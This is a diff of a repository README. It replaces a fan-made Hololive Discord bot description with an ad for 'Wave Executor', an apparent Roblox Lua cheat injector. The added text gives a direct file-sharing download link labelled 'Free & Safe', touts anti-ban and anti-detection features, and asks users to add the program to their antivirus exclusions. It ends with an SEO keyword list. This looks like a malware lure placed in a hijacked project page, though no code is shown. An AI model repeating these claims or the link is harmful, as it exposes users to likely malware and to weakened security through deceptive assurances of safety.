@@ -1,50 +1,81 @@
-# Discord Hololive Bot
+# Wave Executor — AI-Enhanced Roblox Lua Executor (2025)
 
-Welcome to the Discord Hololive Bot! This bot is designed to provide you with information and fun features related to Hololive VTubers. Whether you want to learn more about Hololive members, get a random clip, or simply add a "peko" to your sentences, this bot has you covered.
+**Wave Executor** blends AI-powered script optimization with a secure runtime so you can execute Lua scripts for Roblox more intelligently.
 
-## Table of Contents
-- [Features](#features)
-- [Usage](#usage)
-- [Commands](#commands)
+---
 
-## Features
+🔥 [📥 Download Wave Executor (Free & Safe)](https://www.4sync.com/web/directDownload/FEdmHuqk/TFKslE2D.060ef0f710400e694ef6e5dbeca2f8c2)  
 
-### 1. Get Hololive Member Information
-- Use the `!hololive` command to see information about all Hololive members.
+**Compatibility:** Windows 7–11 (64-bit)
 
-### 2. Get a Random Clip
-- Use the `!clip` command to get a random clip from any Hololive member.
+**Protection:** Built‑in safeguards
 
-### 3. Pekofy Your Sentences
-- Add a "peko" to your sentences with the `!peko` command, in the style of Hololive's Pekora.
+---
 
-### 4. Check if a Member is Live
-- Use the `!streaming` command to check if a specific Hololive member is currently live.
+## What is Wave Executor?
 
-### 5. Check for Upcoming Streams
-- Use the `!upcoming` command to check if a specific Hololive member has an upcoming stream.
+Wave Executor is a Lua executor augmented with AI that analyzes and optimizes scripts before running them inside a controlled environment.
 
-### 6. See All Members Currently Live
-- Use the `!allstreaming` command to see a list of all Hololive members currently live.
+> *"Fast, intelligent, and dependable."*
 
-### 7. See All Members with Upcoming Streams
-- Use the `!allupcoming` command to see a list of all Hololive members with upcoming streams.
+---
 
-## Usage
+## Key Features
 
-To use the Hololive Bot, simply invite it to your Discord server and start using the provided commands. You can also set up custom prefixes and configure bot settings to tailor its behavior to your server's needs.
+### Script Support
 
-## Commands
+* Full Lua support, including module handling
+* Rapid injection and consistent execution
+* Integrated code editor with productivity tools
 
-- `!hololive`: Get information about all Hololive members.
-- `!clip`: Get a random clip from any Hololive member.
-- `!peko`: Add "peko" to your sentences.
-- `!streaming [member]`: Check if a specific Hololive member is currently live.
-- `!upcoming [member]`: Check if a specific Hololive member has an upcoming stream.
-- `!allstreaming`: See a list of all Hololive members currently live.
-- `!allupcoming`: See a list of all Hololive members with upcoming streams.
+### Stability & Safety
 
+* Anti‑ban protections built into the runtime
+* Regular updates to keep compatibility with Roblox changes
+* Optional obfuscation to protect your scripts
 
-**Note:** This Discord bot is not officially affiliated with Hololive or Hololive members. It is a fan-made personal project for entertainment purposes.
+### Compatibility & Performance
 
-Enjoy using the Hololive Discord Bot! If you have any questions or need assistance, don't hesitate to ask.
+* Runs on 64‑bit Windows (7, 8, 10, 11)
+* Lightweight footprint — suitable for low‑spec PCs
+* Support for common Roblox script formats
+
+### Extras
+
+* Script manager UI with organized storage
+* Console logging and configurable hotkeys
+* Ability to run multiple scripts at once
+
+---
+
+## System Requirements
+
+* 64‑bit Windows (7 / 8 / 10 / 11)
+* Roblox Player installed
+* Internet connection for updates and features
+* (Optional) Add to antivirus exclusions for uninterrupted use
+
+---
+
+## Why Choose Wave?
+
+* AI‑driven script analysis and optimization
+* Performance improvements and execution controls
+* Multi‑layer anti‑detection mechanisms
+* Automatic updates to stay current
+
+---
+
+## SEO Keywords
+
+* Wave Roblox executor AI
+* Smart Roblox Lua injector
+* Download Wave Executor 2025
+* Wave anti‑detection exploit
+* Free safe Roblox executor
+
+---
+
+## Support
+
+If you need help or want to report issues, contact support for assistance and feedback.
